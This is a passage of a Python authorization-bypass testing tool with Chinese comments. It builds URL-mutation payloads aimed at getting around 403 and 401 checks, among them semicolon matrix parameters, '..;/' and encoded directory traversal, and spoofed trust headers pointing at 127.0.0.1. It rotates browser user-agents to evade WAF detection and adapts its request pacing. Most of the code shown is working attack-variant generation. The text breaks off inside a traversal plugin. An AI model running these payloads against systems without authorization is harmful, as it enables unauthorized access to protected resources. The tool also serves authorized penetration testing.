#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import argparse
import asyncio
import base64
import csv
import difflib
import hashlib
import html as html_lib
import json
import os
import random
import re
import statistics
import sys
import time
import unicodedata
from urllib.parse import unquote, urlparse, urljoin

try:
    import aiohttp
    from aiohttp import ClientTimeout
    from yarl import URL
except ImportError:
    print("[-] 缺少依赖，请先执行: pip install aiohttp")
    sys.exit(1)

try:
    import yaml
except ImportError:
    yaml = None


# ---------------------------------------------------------------------------
# v3.9: 终端彩色输出（ANSI 转义序列）
# ---------------------------------------------------------------------------
def _enable_ansi():
    """Windows 10+ 控制台启用 VT 转义序列支持；其余平台默认支持"""
    if os.name != "nt":
        return True
    try:
        import ctypes
        h = ctypes.windll.kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
        mode = ctypes.c_ulong()
        if not ctypes.windll.kernel32.GetConsoleMode(h, ctypes.byref(mode)):
            return False
        if not (mode.value & 0x0004):  # ENABLE_VIRTUAL_TERMINAL_PROCESSING
            if not ctypes.windll.kernel32.SetConsoleMode(h, mode.value | 0x0004):
                return False
        return True
    except (OSError, AttributeError, ValueError):
        return False


class C:
    """终端调色板。init() 判定禁用颜色时把所有色码置空串，输出零污染"""
    ENABLED = False
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
    BLUE = "\033[94m"; MAGENTA = "\033[95m"; CYAN = "\033[96m"; GRAY = "\033[90m"

    @classmethod
    def init(cls, no_color=False):
        cls.ENABLED = (not no_color and not os.environ.get("NO_COLOR")
                       and hasattr(sys.stdout, "isatty") and sys.stdout.isatty()
                       and _enable_ansi())
        if not cls.ENABLED:
            for k in ("RESET", "BOLD", "DIM", "RED", "GREEN", "YELLOW",
                      "BLUE", "MAGENTA", "CYAN", "GRAY"):
                setattr(cls, k, "")


def _c(text, *styles):
    """按语义上色（颜色禁用时原样返回）。
    调用方须先用 pad() 对齐再上色——ANSI 色码不参与宽度计算"""
    if not C.ENABLED:
        return str(text)
    return "".join(styles) + str(text) + C.RESET


def c_hit(text):  return _c(text, C.BOLD, C.RED)      # ★ 疑似绕过——亮红加粗
def c_rev(text):  return _c(text, C.YELLOW)           # △ 需复核/警告——黄
def c_err(text):  return _c(text, C.GRAY)             # ✕ 请求失败——暗灰
def c_bad(text):  return _c(text, C.RED)              # [-] 运行错误——红
def c_info(text): return _c(text, C.CYAN)             # [*] 流程信息——青
def c_ok(text):   return _c(text, C.GREEN)            # 正常/完成——绿
def c_warn(text): return _c(text, C.BOLD, C.MAGENTA)  # 熔断/重要告警——品红加粗
def c_head(text): return _c(text, C.BOLD, C.CYAN)     # 标题/分隔线——青加粗
def c_dim(text):  return _c(text, C.DIM)              # 次要说明——淡


def verdict_style(verdict):
    """判定结果 -> 上色函数（未命中/未知返回 None，保持默认色）"""
    return {"★疑似绕过": c_hit, "△需复核": c_rev,
            "✕请求失败": c_err, "✕客户端丢弃": c_err}.get(verdict)


# ---------------------------------------------------------------------------
# 常量与正则
# ---------------------------------------------------------------------------
VERSION = "4.5"  # v4.5: 客户端保真层——多值头保真/URL字段级保真检测/客户端丢弃终态/发送统计+覆盖度退出码
OK_CODES = {200, 201, 202, 204}
REDIRECT_CODES = {301, 302, 303, 307, 308}
DENY_CODES = {401, 403}
DENY_LIKE = DENY_CODES | {405}
NO_BODY_METHODS = {"HEAD", "OPTIONS", "TRACE"}
AUTH_SIM_THRESHOLD = 0.85
MAX_BODY_SIZE = 512 * 1024  # 512KB，流式读取上限
MAX_DIFF_CHARS = 20 * 1024  # HTML diff 视图单边字符上限（防大卡）

LOGIN_HINT = re.compile(r"(?i)login|signin|sign-in|/auth|sso|cas\b")
DENY_HINT = re.compile(
    r"(?i)access denied|forbidden|unauthorized|permission denied|not allowed|"
    r"无权限|没有权限|权限不足|拒绝访问|请先登录|尚未登录|未登录|登录已过期|重新登录")

DYN_PATTERNS = [
    (re.compile(r"\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}(\.\d+)?"), "<DATETIME>"),
    (re.compile(r"\d{10,13}"), "<TIMESTAMP>"),
    (re.compile(r"(?i)((?:csrf|token|nonce|ticket|jsessionid|session)[\w-]*[\"']?\s*[:=]\s*[\"'])[^\"'&<>\s]+"), r"\1<VALUE>"),
    (re.compile(r"[0-9a-fA-F]{32,}"), "<HEX>"),
    (re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"), "<UUID>"),
]

TAG_RE = re.compile(r"(?is)<(script|style)[^>]*>.*?</\1>|<[^>]+>")
WS_RE = re.compile(r"\s+")

# v3.7: 借道前缀池扩充（8 → 16）——注意保持 "static" 在首位（NginxPlugin 取 [0]）
STATIC_PREFIXES = ("static", "public", "assets", "res", "js", "css", "images", "i",
                   "img", "statics", "dist", "media", "fonts", "vendor", "cdn", "build")
# v3.7: 静态后缀池大扩充（8 → 38）：覆盖页面/Java动态/脚本样式/图片/字体/媒体文档，
# 命中网关 location ~* \.(js|css|png)$ 等静态放行规则与静态资源 HandlerMapping 的常见面
STATIC_SUFFIXES = (
    # 页面/模板
    ".html", ".htm", ".shtml", ".xhtml",
    # Java 动态映射
    ".do", ".action", ".jsp", ".jsf", ".jspx",
    # 数据
    ".json", ".jsonp", ".xml",
    # 脚本/样式
    ".js", ".mjs", ".css", ".map", ".less", ".scss",
    # 图片
    ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".webp", ".bmp",
    # 字体
    ".woff", ".woff2", ".ttf", ".eot", ".otf",
    # 媒体/文档/其它
    ".txt", ".pdf", ".zip", ".mp4", ".mp3", ".swf",
)
# v3.7: 分号×后缀矩阵的核心池——;.js / ;1.js 两个最高价值形态走全量池，
# 其余形态（字母/矩阵参数/反序/编码分号等）取核心池控制请求量
SEMICOLON_SUFFIX_CORE = (".js", ".css", ".png", ".html", ".json",
                         ".jpg", ".gif", ".svg", ".ico", ".map")
IP_SPOOF_HEADERS = ("X-Forwarded-For", "X-Real-IP", "X-Client-IP",
                    "X-Remote-IP", "X-Remote-Addr", "Client-IP")
# v4.3 [P0-2] 《403 Forbidden 绕过技术》全量信任头字典补齐（原 16/37 → 37/37）。
# URL/地址类信任头取 127.0.0.1 方向；拼写错误变体保留——部分自研中间件
# 确实用错误拼写的头名（X-Forward-For/X-Forwarder-For/Referrer/Refferer）做信任判断
ARTICLE_TRUST_HEADERS = (
    "Base-Url", "Http-Url", "Proxy-Host", "Proxy-Url", "Real-Ip",
    "Redirect", "Request-Uri", "Uri", "Url",
    "X-Http-Destinationurl", "X-Original-Remote-Addr", "X-Proxy-Url",
    "X-True-IP", "X-Forwarded", "X-Forwarded-By", "X-Forwarded-For-Original",
    "X-Forward-For", "X-Forwarder-For", "Referrer", "Refferer",
)
# X-Forwarded-Port 文章五值 + X-Forwarded-Scheme 文章 http 降级方向（脚本原仅 https）
ARTICLE_XFP_PORTS = ("443", "4443", "80", "8080", "8443")

# v4.3 [P0-3] 浏览器 UA 池——默认随机轮换。固定发送 authz-bypass-tester/{VERSION}
# 会在 UA 黑名单/WAF 工具识别目标上被整轮拦截（基线连同变形一起 403，
# 产生全量漏报或触发风控熔断）；--user-agent 可固定指定单一 UA
BROWSER_UA_POOL = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
)

# v3.1 [D6 修复] WAF 指纹分三级，消除正文泛化关键字误伤：
#   头部强指纹：命中 Server / WAF 专用响应头即判定
WAF_HEADER_SIGNATURES = [
    (re.compile(r"(?i)cloudflare|cf-ray|__cf_bm"), "Cloudflare"),
    (re.compile(r"(?i)akamai|akamaighost"), "Akamai"),
    (re.compile(r"(?i)sucuri"), "Sucuri"),
    (re.compile(r"(?i)f5.{0,10}bigip|bigipserver"), "F5 BIG-IP"),
    (re.compile(r"(?i)mod_?security"), "ModSecurity"),
    (re.compile(r"(?i)aliyun[-_]?waf|waf-cg|x-acw-"), "阿里云WAF"),
    (re.compile(r"(?i)tencent[-_ ]?waf|tsec[-_]?waf|stgw"), "腾讯云WAF"),
    (re.compile(r"(?i)safedog|safe3"), "安全狗"),
    (re.compile(r"(?i)yunsuo"), "云锁"),
    (re.compile(r"(?i)baidu[-_]?waf|yunjiasu"), "百度云防护"),
]
#   正文强指纹：多字无歧义特征，单独命中即判定
WAF_BODY_STRONG = [
    (re.compile(r"请求被拦截|阻断了您的访问|非法请求已被|已被.{0,10}安全.{0,10}拦截|web应用防火墙"), "通用WAF"),
    (re.compile(r"(?i)access denied by|blocked by.{0,20}(waf|firewall|security)|security rule (violation|triggered)"), "安全防护"),
    (re.compile(r"(?i)mod_?security.{0,20}rules?"), "ModSecurity"),
    (re.compile(r"(?i)incident id|support id.{0,10}[0-9a-f-]{8,}"), "WAF事件页"),
]
#   正文弱指纹：较短/较泛化，必须有拦截类状态码佐证才判定
WAF_BODY_WEAK = [
    (re.compile(r"安全拦截|访问被拦截|请求异常.{0,10}拦截"), "安全拦截"),
    (re.compile(r"(?i)request blocked|malicious request|attack detected"), "安全防护"),
]
WAF_CORROBORATE_CODES = {403, 406, 418, 429, 501, 503}
# 参与头部指纹匹配的响应头（Server 之外常见的 WAF 标识头）
WAF_HEADER_KEYS = ("server", "x-cdn", "x-waf", "x-sucuri-id", "cf-ray",
                   "x-acw-sc__v2", "x-acw-sc__v3", "x-backside-transport")

# 类别字母映射（用于 --categories 筛选）
CATEGORY_MAP = {
    "A": "分号参数", "B": "..;/ 穿越", "C": "目录穿越",
    "D": "借道前缀", "E": "大小写", "F": "斜杠",
    "G": "后缀匹配", "H": "特殊编码", "I": "HTTP方法",
    "J": "转发头", "K": "来源伪造", "L": "路径结构",
    "M": "缓存欺骗", "N": "DotNet", "O": "NodeJs", "P": "Nginx",
    # v3.2 新增类别
    "Q": "路径规范化", "R": "编码解码", "S": "尾缀差异",
    "T": "重定向差异", "U": "请求头重写",
    # v3.4 新增类别
    "V": "Unicode规范化", "W": "认证构造", "X": "组合变形",
    "Y": "Host改写", "Z": "绝对URI",
    # v3.5 新增类别
    "AA": "段变异",
    # v3.6 新增类别
    "AB": "段大小写",
    # v3.7 新增类别
    "AC": "分号后缀",
    # v4.1 新增类别
    "AD": "CRLF头注入", "AE": "查询污染",
    "AF": "百分号编码矩阵", "AG": "反斜杠解析", "AH": "点段规范化矩阵",
    "AI": "重复斜杠与路径压缩", "AJ": "路径查询边界", "AK": "路径截断与后缀解析",
    # v4.3 新增类别
    "AL": "协议切换", "AM": "JWT篡改",
}


# ---------------------------------------------------------------------------
# 0. 工具函数
# ---------------------------------------------------------------------------
def pad(s, width):
    """按东亚字符宽度对齐"""
    w = sum(2 if unicodedata.east_asian_width(ch) in "WF" else 1 for ch in s)
    return s + " " * max(0, width - w)


def mask_cookie(cookie):
    """报告中的 Cookie 脱敏：每个键值只保留前 4 位"""
    if not cookie:
        return ""
    return re.sub(r"=([^;\s]{4})[^;\s]*", r"=\1***", cookie)


def sha16(s):
    """响应体短哈希"""
    return hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16] if s else ""


def esc(s):
    """HTML 转义"""
    return html_lib.escape(str(s)) if s else ""


def split_path(url):
    p = urlparse(url)
    segs = [s for s in p.path.split("/") if s != ""]
    return f"{p.scheme}://{p.netloc}", segs, p.query


def pct_encode_char(ch, double=False):
    """v3.1 [D4 修复] 按 UTF-8 字节进行百分号编码；double=True 时做双重编码。
    旧实现按 Unicode 码点编码（f"%{ord(ch):02x}"），非 ASCII 字符（ord>255）
    会产出 %4e2d 这类非法序列，且 URL 编码本就应是字节级。"""
    return "".join((f"%25{b:02x}" if double else f"%{b:02x}") for b in ch.encode("utf-8"))


def pct_encode(s, double=False):
    """v3.2: 整串按 UTF-8 字节百分号编码（double=True 双重编码）"""
    return "".join(pct_encode_char(ch, double) for ch in s)


def downgrade_conf(conf):
    """v3.1 [D5 修复] 置信度降一档"""
    return {"高": "中", "中": "低"}.get(conf, conf)


# ---------------------------------------------------------------------------
# 1. 异步限速器
# ---------------------------------------------------------------------------
class AsyncRateLimiter:
    """异步全局限速器：间隔 >= base*factor 秒 + 随机抖动；
    429 时 factor 翻倍（上限 16x）；v3.1 新增 reward()——成功后 factor 渐进回落，
    并支持 base=0 快速路径（不进锁）。"""

    def __init__(self, interval, jitter=0.3):
        self.base = max(0.0, interval)
        self.jitter = max(0.0, min(1.0, jitter))
        self._factor = 1.0
        self._lock = asyncio.Lock()
        self._last = 0.0

    async def wait(self):
        if self.base <= 0:
            return  # v3.1: 无间隔要求时不进锁，避免高并发下锁成为瓶颈
        async with self._lock:
            interval = self.base * self._factor
            if interval and self.jitter:
                interval += random.uniform(0, interval * self.jitter)
            now = time.monotonic()
            gap = now - self._last
            if gap < interval:
                await asyncio.sleep(interval - gap)
            self._last = time.monotonic()

    async def penalize(self):
        async with self._lock:
            self._factor = min(self._factor * 2, 16.0)

    async def reward(self):
        """v3.1: 请求成功后 factor 渐进回落（每次 *0.75，下限 1.0）"""
        if self._factor <= 1.0:
            return
        async with self._lock:
            self._factor = max(1.0, self._factor * 0.75)


# ---------------------------------------------------------------------------
# 2. 响应指纹与内容感知相似度（JSON 值类型感知）
# ---------------------------------------------------------------------------
def fingerprint(body):
    """稳定性检查用指纹：归一化动态字段 + title 提权"""
    if not body:
        return ""
    text = body[:12000]
    for pat, rep in DYN_PATTERNS:
        text = pat.sub(rep, text)
    m = re.search(r"(?is)<title[^>]*>(.*?)</title>", text)
    title = m.group(1).strip() if m else ""
    return (title + "\n" + text)[:4000]


def similarity(a, b):
    """基于 markup 指纹的相似度——仅用于基线稳定性检查"""
    fa, fb = fingerprint(a), fingerprint(b)
    if not fa and not fb:
        return 1.0
    if not fa or not fb:
        return 0.0
    return difflib.SequenceMatcher(None, fa, fb).ratio()


def visible_text(body):
    """去 script/style/标签，只保留正文文本"""
    return WS_RE.sub(" ", TAG_RE.sub(" ", body or "")).strip()


SENSITIVE_KEY_RE = re.compile(
    r"(?i)phone|mobile|id_?card|bank|balance|salary|token|secret|email|address|password|credential")


def sensitive_field_overlap(base_high_body, resp_body):
    """v3.4 [G8] 高权限基线敏感字段在变形响应中的命中率。
    按 key 路径的末段字段名匹配（不要求两份 JSON 结构一致——越权响应
    常常换了个包装结构返回同样的敏感数据）。
    返回 (命中率, 命中字段列表)，非 JSON / 高权限无敏感字段时返回 None。"""
    pa = json_value_profile(base_high_body or "")
    pb = json_value_profile(resp_body)
    if not pa or not pb:
        return None
    leaf = lambda keys: {k.rsplit(".", 1)[-1].split("[")[0].split("]")[0]
                         for k in keys if k.rsplit(".", 1)[-1]}
    sens = {k for k in leaf(pa) if SENSITIVE_KEY_RE.search(k)}
    if not sens:
        return None
    hit = sens & leaf(pb)
    return len(hit) / len(sens), sorted(hit)


REDACT_PATTERNS = [
    (re.compile(r"(?<!\d)1[3-9]\d{9}(?!\d)"), "<手机号>"),
    (re.compile(r"(?<!\d)\d{17}[\dXx](?!\d)"), "<身份证>"),
    (re.compile(r"(?i)\b[\w.+-]+@[\w-]+\.[\w.-]+\b"), "<邮箱>"),
    (re.compile(r"(?<!\d)\d{16,19}(?!\d)"), "<银行卡>"),
]


def redact_text(text):
    """v3.4 [P3] 证据脱敏：手机号 / 身份证 / 邮箱 / 银行卡"""
    for pat, rep in REDACT_PATTERNS:
        text = pat.sub(rep, text or "")
    return text


def json_value_profile(body):
    """提取 JSON 值的类型画像——每个 key 路径 → 值类型 + 量级"""
    try:
        data = json.loads(body)
    except (ValueError, TypeError):
        return None
    profile = {}

    def classify(val):
        if val is None:
            return "null"
        if isinstance(val, bool):
            return "bool"
        if isinstance(val, (int, float)):
            if val == 0:
                return "num:0"
            magnitude = len(str(int(abs(val))))
            return f"num:{magnitude}"
        if isinstance(val, str):
            length = len(val)
            if length == 0:
                return "str:0"
            if length < 10:
                return "str:s"
            if length < 100:
                return "str:m"
            return "str:l"
        if isinstance(val, list):
            return f"list:{len(val)}"
        if isinstance(val, dict):
            return f"dict:{len(val)}"
        return "unknown"

    def walk(o, path):
        if isinstance(o, dict):
            for k, v in o.items():
                p = f"{path}.{k}" if path else str(k)
                profile[p] = classify(v)
                walk(v, p)
        elif isinstance(o, list):
            for item in o[:20]:
                walk(item, path + "[]")

    walk(data, "")
    return profile


def json_value_similarity(body_a, body_b):
    """JSON 值类型感知相似度——key 路径 Jaccard (60%) + 值类型匹配 (40%)
    比纯 key 路径 Jaccard 更精确：能区分 {"data":[1,2,3]} 与 {"data":[]}"""
    pa, pb = json_value_profile(body_a), json_value_profile(body_b)
    if pa is None or pb is None:
        return None
    if not pa and not pb:
        return 1.0
    keys_a, keys_b = set(pa.keys()), set(pb.keys())
    union = keys_a | keys_b
    if not union:
        return 1.0
    key_sim = len(keys_a & keys_b) / len(union)
    common = keys_a & keys_b
    if common:
        type_match = sum(1 for k in common if pa[k] == pb[k]) / len(common)
    else:
        type_match = 0.0
    return 0.6 * key_sim + 0.4 * type_match


def _ratio(a, b, cutoff=0.0):
    """带 real_quick_ratio 预筛的 difflib 比值"""
    sm = difflib.SequenceMatcher(None, a, b)
    if cutoff > 0 and sm.real_quick_ratio() < cutoff:
        return 0.0
    return sm.ratio()


def content_similarity(body_a, ctype_a, body_b, ctype_b, cutoff=0.0):
    """内容感知相似度。
    - 双方都是 JSON：优先使用值类型感知相似度（比纯 key Jaccard 更精确）
    - 否则：去标签取正文 + 动态字段归一化后做 difflib
    """
    if not body_a and not body_b:
        return 1.0
    if not body_a or not body_b:
        return 0.0
    if "json" in (ctype_a or "").lower() and "json" in (ctype_b or "").lower():
        val_sim = json_value_similarity(body_a, body_b)
        if val_sim is not None:
            return val_sim
    ta, tb = visible_text(body_a)[:4000], visible_text(body_b)[:4000]
    if not ta and not tb:
        return 1.0
    if not ta or not tb:
        return 0.0
    for pat, rep in DYN_PATTERNS:
        ta = pat.sub(rep, ta)
        tb = pat.sub(rep, tb)
    return _ratio(ta, tb, cutoff)


def is_login_redirect(location):
    return bool(location) and bool(LOGIN_HINT.search(location))


# ---------------------------------------------------------------------------
# 3. WAF / CDN 检测 + 响应头分析 + RTT 异常
# ---------------------------------------------------------------------------
def detect_waf(resp):
    """v3.1 [D6 修复] 检测响应是否为 WAF 拦截页面。
    三级指纹策略：
      1) 头部强指纹（Server / WAF 专用头）——命中即判定；
      2) 正文强指纹（多字无歧义特征）——命中即判定；
      3) 正文弱指纹——必须伴随拦截类状态码（403/406/418/429/501/503）佐证。
    修复了旧版正文中出现 "blocked"/"拦截"/"tencent" 等泛化词即误判的问题。
    """
    code = resp.get("code", 0)
    headers = resp.get("headers", {})
    header_blob = " ".join(
        [resp.get("server", "")]
        + [f"{k}:{v}" for k, v in headers.items() if k.lower() in WAF_HEADER_KEYS]
    )
    for pat, name in WAF_HEADER_SIGNATURES:
        if pat.search(header_blob):
            return name

    body_text = visible_text(resp.get("body", ""))[:2000]
    for pat, name in WAF_BODY_STRONG:
        if pat.search(body_text):
            return name

    if code in WAF_CORROBORATE_CODES:
        for pat, name in WAF_BODY_WEAK:
            if pat.search(body_text):
                return name
    return None


def is_cached(resp):
    """检测响应是否来自 CDN 缓存"""
    cache_status = resp.get("cache_status", "").upper()
    age = resp.get("age", "")
    if cache_status in ("HIT", "HIT-FROM-CACHE"):
        return True
    if cache_status == "DYNAMIC":
        return False  # Cloudflare DYNAMIC = 未缓存
    if age and age != "0":
        return True
    return False


def header_signals(resp, base_low):
    """分析响应头中的鉴权信号，返回信号列表（v3.1 移除未使用的 base_high 死参数）"""
    signals = []
    resp_h = {k.lower(): v for k, v in resp.get("headers", {}).items()}
    base_h = {k.lower(): v for k, v in base_low.get("headers", {}).items()}

    # Set-Cookie 变化：变形响应设置了新的会话 Cookie → 可能触发了登录流程
    if "set-cookie" in resp_h and "set-cookie" not in base_h:
        signals.append("响应设置新Cookie")
    # WWW-Authenticate
    if "www-authenticate" in resp_h:
        signals.append("响应含WWW-Authenticate头")
    # X-Powered-By 变化（可能命中不同后端）
    resp_powered = resp_h.get("x-powered-by", "")
    base_powered = base_h.get("x-powered-by", "")
    if resp_powered and base_powered and resp_powered != base_powered:
        signals.append(f"X-Powered-By变化: {base_powered}→{resp_powered}")
    # Content-Type 变化
    resp_ct = resp_h.get("content-type", "")
    base_ct = base_h.get("content-type", "")
    if resp_ct and base_ct and resp_ct != base_ct:
        signals.append(f"Content-Type变化: {base_ct}→{resp_ct}")

    return signals


def rtt_anomaly(resp_rtt, base_rtt_list):
    """v3.1 [D2 修复] 检测响应时间异常。
    - >=3 样本：均值 ± 3σ；
    - 2 样本：稳健极差法——响应超过基线最大值 3 倍且绝对差 > 0.5s 才告警。
    旧版要求 >=3 样本，而基线自适应采样通常 2 次即稳定返回，导致该功能永不触发。
    """
    if not base_rtt_list or len(base_rtt_list) < 2:
        return None
    if len(base_rtt_list) >= 3:
        try:
            mean = statistics.mean(base_rtt_list)
            stdev = statistics.stdev(base_rtt_list)
        except statistics.StatisticsError:
            return None
        if stdev > 0 and abs(resp_rtt - mean) > 3 * stdev:
            return f"RTT异常: {resp_rtt:.3f}s vs 基线均值{mean:.3f}s"
        return None
    hi = max(base_rtt_list)
    if resp_rtt > hi * 3 and resp_rtt - hi > 0.5:
        return f"RTT异常: {resp_rtt:.3f}s vs 基线最大{hi:.3f}s"
    return None


# ---------------------------------------------------------------------------
# 4. 变形生成器插件化架构
# ---------------------------------------------------------------------------
class VariantPlugin:
    """变形生成插件基类"""
    category = ""

    def generate(self, ctx):
        """Override in subclass. ctx 包含 prefix/segs/query/orig_path/first/rest/tail_rest/qo"""
        raise NotImplementedError

    @staticmethod
    def _build(cat, desc, raw, ctx, method=None, headers=None, keep_query=True,
               body=None, follow=False, use_absolute=False):
        prefix = ctx["prefix"]
        query = ctx["query"]
        full = raw if raw.startswith("http") else prefix + raw + (("?" + query) if (query and keep_query) else "")
        # v3.8: method=None 继承基础请求方法（-r 请求文件 / --method），body=None 继承
        # 基础请求体，插件附加头叠加在基础请求头之上——POST 目标下所有路径类变形
        # 自动携带原始方法/请求体/请求头，变形与基线的唯一差异收敛为路径本身
        m = (ctx.get("method") or "GET") if method is None else method
        hdrs = dict(ctx.get("base_headers") or {})
        if headers:
            hdrs.update(headers)
        b = ctx.get("body") if body is None else body
        # v3.2: follow=True 标记该变形命中重定向时需做跳转链追踪（见 RedirectProbePlugin）
        # v3.4 [G4]: use_absolute=True 标记该变形以 absolute-form 请求行发送（见 AbsoluteUriPlugin）
        return {"cat": cat, "desc": desc, "url": full, "method": m,
                "headers": hdrs, "body": b, "follow": follow,
                "use_absolute": use_absolute}


class SemicolonPlugin(VariantPlugin):
    category = "分号参数"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail = c["orig_path"], c["first"], c["rest"], c["tail_rest"]
        segs = c["segs"]
        V = self._build
        return [
            V("分号参数", "首段后插 ;foo=bar", f"/{first};foo=bar" + tail if rest else op + ";foo=bar", c),
            V("分号参数", "首段后插 ;jsessionid", f"/{first};jsessionid=AAAA" + tail if rest else op + ";jsessionid=AAAA", c),
            V("分号参数", "末段追加 ;jsessionid", op + ";jsessionid=AAAA", c),
            V("分号参数", "末段追加 ;a=1", op + ";a=1", c),
            V("分号参数", "中间段插 ;a=1", "/" + "/".join(s + ";a=1" for s in segs), c),
            V("分号参数", "尾部单独分号 ;", op + ";", c),
            V("分号参数", "编码分号 %3b", op + "%3ba=1", c),
            V("分号参数", "大写编码分号 %3B", op + "%3Ba=1", c),
            V("分号参数", "双重编码分号 %253b", op + "%253ba=1", c),
            V("分号参数", "/;/ 前缀形式", "/;/" + "/".join(segs), c),
            V("分号参数", "/.;/ 点分号前缀", "/.;/" + "/".join(segs), c),
            V("分号参数", "/%3b/ 编码分号前缀", "/%3b/" + "/".join(segs), c),
            V("分号参数", "首段编码分号 %3bjsessionid",
              f"/{first}%3bjsessionid=AAAA" + tail if rest else op + "%3bjsessionid=AAAA", c),
            # v3.2 [需求3] 矩阵参数扩展：安全层裁剪分号后内容 vs 路由层保留原文的差异面
            V("分号参数", "路径前导矩阵参数 ;a=1/", ";a=1/" + "/".join(segs), c),
            V("分号参数", "每段前置 ;a=1", "/" + "/".join(";a=1" + s for s in segs), c),
            V("分号参数", "首段大写+矩阵参数", "/" + first.upper() + ";a=1" + tail, c),
            V("分号参数", "尾斜杠后分号 /;", op + "/;", c),
            V("分号参数", "全编码矩阵参数 %3ba%3d1", op + "%3ba%3d1", c),
            V("分号参数", "矩阵参数内含路径分隔 ;/x=/", op + ";/x=/", c),
            V("分号参数", "首段矩阵参数+尾随斜杠", f"/{first};a=1/" + (rest or ""), c),
            V("分号参数", "分号+空段包裹 /;/…;/", "/;/" + "/".join(segs) + ";/", c),
            # v3.3 扩充：双分号、编码等号、编码分号混合前缀、参数值含编码分隔符
            V("分号参数", "末段双分号 ;;", op + ";;", c),
            V("分号参数", "双分号矩阵参数 ;;a=1", op + ";;a=1", c),
            V("分号参数", "编码等号矩阵参数 ;a%3d1", op + ";a%3d1", c),
            V("分号参数", "编码分号混合前缀 /%3b;/", "/%3b;/" + "/".join(segs), c),
            V("分号参数", "参数值含编码斜杠 ;x=%2f", op + ";x=%2f", c),
            V("分号参数", "参数值含编码点号 ;x=%2e%2e", op + ";x=%2e%2e", c),
            # v4.1 [P2] GFG.go 对齐：双分号斜杠前缀
            V("分号参数", "/;// 双分号前缀", "/;//" + "/".join(segs), c),
        ]


class TraversalPlugin(VariantPlugin):
    category = "..;/ 穿越"

    def generate(self, ctx):
        c = ctx
        op, first, rest = c["orig_path"], c["first"], c["rest"]
        sj = "/".join(c["segs"])
        V = self._build
        return [
            V("..;/ 穿越", "/x/..;/ + 原路径", "/x/..;" + op, c),
            V("..;/ 穿越", "首段后 ..;/", f"/{first}/..;/" + rest if rest else "/x/..;" + op, c),
            V("..;/ 穿越", "..; 编码形式 /%2e%2e;/", "/x/%2e%2e;" + op, c),
            V("..;/ 穿越", "..;/..;/ 双重组合", "/x/..;/..;" + op, c),
            V("..;/ 穿越", "..;/..;/..;/ 三重组合", "/x/..;/..;/..;" + op, c),
            V("..;/ 穿越", "..; 反斜杠组合", "/x/..;\\..;" + op, c),
            V("..;/ 穿越", "末段 ..;/ 穿越", op + "/..;/", c),
            # v3.3 扩充：更深层级、字面/编码混合、编码分号+编码斜杠组合
            V("..;/ 穿越", "..;/ 四层组合", "/x/..;/..;/..;/..;" + op, c),
            V("..;/ 穿越", "字面+编码混合 /x/..%3b/", "/x/..%3b" + op, c),
            V("..;/ 穿越", "编码分号+编码斜杠 /x/..%3b%2f", "/x/..%3b%2f" + sj, c),
            V("..;/ 穿越", "双写穿越 ....;//", "/x/....;//" + sj, c),
            # v4.1 [P0] SemiTabTraversal.go 对齐：分号×Tab/Null/编码点穿越组合
            # 与超长链（迭代式归一化预算耗尽类实现）
            V("..;/ 穿越", "分号Tab穿越 单层 ;%09..;/", "/x/;%09..;" + op, c),
            V("..;/ 穿越", "分号Tab穿越 双层", "/x/;%09..;/%09..;" + op, c),
            V("..;/ 穿越", "分号Tab穿越 三层", "/x/;%09..;/%09..;/%09..;" + op, c),
            V("..;/ 穿越", "分号Null穿越 ;%00..;/", "/x/;%00..;" + op, c),
            V("..;/ 穿越", "分号编码点穿越 ;%2e%2e;/", "/x/;%2e%2e;" + op, c),
            V("..;/ 穿越", "分号双编码穿越 ;%252e%252e;/", "/x/;%252e%252e;" + op, c),
            V("..;/ 穿越", "超长穿越链 ×28", "/x/" + "..;/" * 28 + op, c),
        ]


class DirectoryTraversalPlugin(VariantPlugin):
    category = "目录穿越"

    def generate(self, ctx):
        c = ctx
        op, segs = c["orig_path"], c["segs"]
        sj = "/".join(segs)
        V = self._build
        return [
            V("目录穿越", "字面 /x/../", "/x/.." + op, c),
            V("目录穿越", "%2e%2e", "/x/%2e%2e" + op, c),
            V("目录穿越", "大写 %2E%2E", "/x/%2E%2E" + op, c),
            V("目录穿越", "..%2f", "/x/..%2f" + sj, c),
            V("目录穿越", "%2e%2e%2f", "/x/%2e%2e%2f" + sj, c),
            V("目录穿越", "%2e%2e%5c 编码反斜杠", "/x/%2e%2e%5c" + sj, c),
            V("目录穿越", "双重编码 %252e%252e", "/x/%252e%252e" + op, c),
            V("目录穿越", "混合 ..%252f", "/x/..%252f" + sj, c),
            V("目录穿越", "双写 ....// 绕过滤器", "/x/....//" + sj, c),
